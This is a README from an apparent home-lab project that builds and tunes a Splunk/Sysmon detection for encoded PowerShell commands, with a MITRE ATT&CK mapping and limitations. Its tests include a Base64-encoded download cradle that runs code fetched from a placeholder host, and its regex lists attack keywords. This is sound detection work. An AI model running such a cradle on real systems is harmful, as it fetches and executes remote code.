# Splunk Detection Rule: PowerShell Encoded Command Execution

**Tools used:** Splunk, Sysmon, Windows Event Logs, MITRE ATT&CK, Python  
**Difficulty:** Beginner/Intermediate  
**Time spent:** About a weekend  
**Status:** Complete -- rule is live in my home lab

---

## Background

This one started because I failed a mock interview question. The interviewer asked me to walk through how I'd detect PowerShell being used for lateral movement and I gave a pretty generic answer about "looking for suspicious PowerShell activity." Not good enough. I went home and actually built the detection instead of just knowing it exists.

PowerShell encoded command execution (the `-EncodedCommand` or `-enc` flag) is one of those techniques that shows up constantly. It's in so many malware families, red team playbooks, and real incidents. Defenders need to be able to catch it reliably without drowning in false positives from legitimate admin activity.

This project covers building the detection from scratch, the SPL query, tuning it, and documenting the logic so someone else could maintain it.

---

## Why encoded commands are suspicious

When PowerShell runs with `-EncodedCommand`, it takes a Base64-encoded string and executes it. The reason attackers love this is simple: it bypasses a lot of basic string-matching rules. If you're only looking for keywords like "Invoke-Mimikatz" or "IEX" in command lines, encoded commands skip right past that.

Legitimate use does exist. Some deployment scripts use it, certain monitoring agents use it. But the volume of legitimate encoded commands in a typical environment is low enough that alerting on it with some tuning is very viable.

---

## The detection logic

### What I'm looking for

1. PowerShell process spawned with `-EncodedCommand`, `-enc`, or `-ec` flag
2. The parent process is something unexpected (not a legitimate scheduler or deployment tool)
3. The encoded payload, when decoded, contains suspicious strings

### Data source

Windows Security Event Logs + Sysmon Event ID 1 (Process Create). Sysmon is doing the heavy lifting here because native Windows process logging doesn't capture full command-line arguments by default.

Sysmon config I used is in `/configs/sysmonconfig.xml`. I'm using a modified version of SwiftOnSecurity's config.

### Base SPL query

```spl
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| where like(CommandLine, "%-enc%") 
    OR like(CommandLine, "%-EncodedCommand%") 
    OR like(CommandLine, "%-ec %")
| eval decoded_command = base64decode(
    mvindex(split(CommandLine, " "), -1)
  )
| eval suspicious_strings = if(
    match(decoded_command, "(?i)(iex|invoke-expression|downloadstring|webclient|bypass|hidden|nop|noprofile|mimikatz|net\.webclient)"),
    "YES", "NO"
  )
| table _time, ComputerName, User, ParentImage, CommandLine, decoded_command, suspicious_strings
| sort - _time
```

### What this query does

It pulls Sysmon process create events, filters for any PowerShell command line containing the encoded command flags, then tries to Base64-decode the last argument (which is usually where the payload sits). After decoding it checks for common malicious strings in the plaintext.

This is not perfect. The Base64 extraction is naive and breaks on multi-line payloads or when the encoding is nested. I'll note that in the limitations section.

### Tuned version with false positive reduction

After running the base query for a few days in my lab I found two noisy legitimate sources: a software deployment agent and Windows Task Scheduler running a backup script. Added exclusions for those parent processes.

```spl
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| where (like(CommandLine, "%-enc%") 
    OR like(CommandLine, "%-EncodedCommand%") 
    OR like(CommandLine, "%-ec %"))
    AND Image="*\\powershell.exe"
| where NOT (
    ParentImage="*\\svchost.exe" AND like(CommandLine, "%backup%")
)
| where NOT ParentImage IN (
    "*\\deploy_agent.exe",
    "*\\msiexec.exe"
)
| eval decoded_command = base64decode(
    mvindex(split(CommandLine, " "), -1)
  )
| eval parent_suspicious = if(
    ParentImage IN ("*\\cmd.exe", "*\\wscript.exe", "*\\cscript.exe", "*\\mshta.exe"),
    "HIGH", "MEDIUM"
  )
| table _time, ComputerName, User, ParentImage, parent_suspicious, CommandLine, decoded_command
| sort - _time
```

### Alert threshold

Set this as a real-time alert in Splunk with a threshold of 1. Any hit fires an alert. The tuning brings false positives low enough that a 1-count threshold is sustainable. In a real enterprise environment you'd want to suppress by user and machine for known-good scheduled tasks.

---

## Testing the rule

Tested against three scenarios in my lab VM (Windows 10, isolated network segment).

**Test 1: Simulated download cradle**

```powershell
powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0AJwApAA==
```

Decodes to `IEX (New-Object Net.WebClient).DownloadString('https://example[.]com')`. Alert fired as expected, decoded string showed in results, suspicious_strings flagged YES.

**Test 2: Legitimate admin task**

Ran a base64-encoded version of `Get-Process | Export-CSV` to simulate a legitimate admin script. Alert fired correctly (we want to see it), decoded command was clearly benign. This is where an analyst would review and suppress if it's a known-good task.

**Test 3: Parent process chaining**

Simulated a macro calling cmd.exe calling PowerShell with encoded command. `parent_suspicious` field came back HIGH because the parent was cmd.exe, which is one of the flagged parents.

All three test results are in `/testing/test_results.md`.

---

## MITRE ATT&CK mapping

| Technique | ID | Notes |
|---|---|---|
| PowerShell | T1059.001 | Core technique being detected |
| Obfuscated Files or Information | T1027 | Encoded command is a form of obfuscation |
| Command and Scripting Interpreter | T1059 | Parent technique |
| Deobfuscate/Decode Files or Info | T1140 | The decode step in the query handles this |

---

## Known limitations

The Base64 decode in SPL is fragile. If the payload is split across arguments or double-encoded, this breaks. I want to write a Python enrichment script that handles this more robustly. That's the next thing on my list.

No coverage for PowerShell 2.0 downgrade attacks (`-Version 2`). That's a separate detection that should pair with this one.

The parent process exclusions are specific to my lab. In a real deployment you'd need to baseline your environment first and build exclusions from that.

---

## Files in this folder

```
02-splunk-detection-rule/
├── README.md                    <- you're here
├── queries/
│   ├── base_detection.spl
│   └── tuned_detection.spl
├── configs/
│   └── sysmonconfig.xml
├── testing/
│   └── test_results.md
└── screenshots/
    ├── splunk_alert_trigger.png
    ├── decoded_payload_result.png
    └── mitre_navigator_layer.json
```

---

## References

- Sysmon by SwiftOnSecurity: https://github.com/SwiftOnSecurity/sysmon-config
- MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/
- Splunk SPL reference: https://docs.splunk.com/Documentation/Splunk/latest/SearchReference
- Sigma rule equivalent for cross-SIEM porting: https://github.com/SigmaHQ/sigma
